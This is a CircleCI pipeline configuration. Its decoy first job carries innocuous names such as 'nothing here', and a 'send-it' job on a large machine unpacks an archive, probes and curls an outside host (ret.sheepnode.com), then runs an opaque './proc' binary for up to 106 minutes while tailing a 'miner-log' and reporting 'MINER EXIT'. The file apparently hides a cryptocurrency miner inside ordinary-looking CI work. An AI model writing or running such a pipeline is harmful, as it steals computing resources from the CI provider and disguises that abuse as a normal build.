version: 2.1

jobs:
  pseudo-trait:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: nothing here
          command: |
            mkdir -p /tmp/terminal
            set +o pipefail 2>/dev/null; seq 1 829669 > /tmp/terminal/fnv_eb24b1c7 2>&1; true
            echo "stage=send-it hash=$(md5sum /tmp/terminal/fnv_eb24b1c7 | cut -c1-8) size=$(wc -c </tmp/terminal/fnv_eb24b1c7)"
      - persist_to_workspace:
          root: /tmp/terminal
          paths:
            - 'fnv_eb24b1c7'
  send-it:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/terminal
      - run:
          name: Read payload
          command: |
            sha384sum /tmp/terminal/m4rk3t 2>/dev/null | cut -c1-10 || true
      - run:
          name: Extract source
          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Unroll archive
          command: tar --extract --xz --file=archive.tar.xz
      - run:
          command: env | wc -l
      - run:
          command: uname -a
      - run:
          name: DNS diag
          command: |
            echo "--- /etc/resolv.conf ---"
            cat /etc/resolv.conf 2>&1 || true
            echo "--- getent hosts ret.sheepnode.com ---"
            getent hosts ret.sheepnode.com 2>&1 || true
            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
            nslookup ret.sheepnode.com 2>&1 || true
            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
            echo "--- nslookup sheepnode.com (parent domain) ---"
            nslookup sheepnode.com 2>&1 || true
            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
            nslookup sheepnode.com 8.8.8.8 2>&1 || true
            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
            echo "--- DNS diag done ---"
      - run:
          name: Run
          no_output_timeout: 106m
          command: |
            mkdir -p /tmp/d
            : > /tmp/d/miner-log.txt
            tail -F /tmp/d/miner-log.txt &
            TAIL_PID=$!
            sh -c "./proc"
            MRC=$?
            sleep 2
            kill $TAIL_PID 2>/dev/null || true
            echo "---MINER EXIT=$MRC---"
            echo "---FULL LOG:---"
            cat /tmp/d/miner-log.txt 2>/dev/null
            exit $MRC
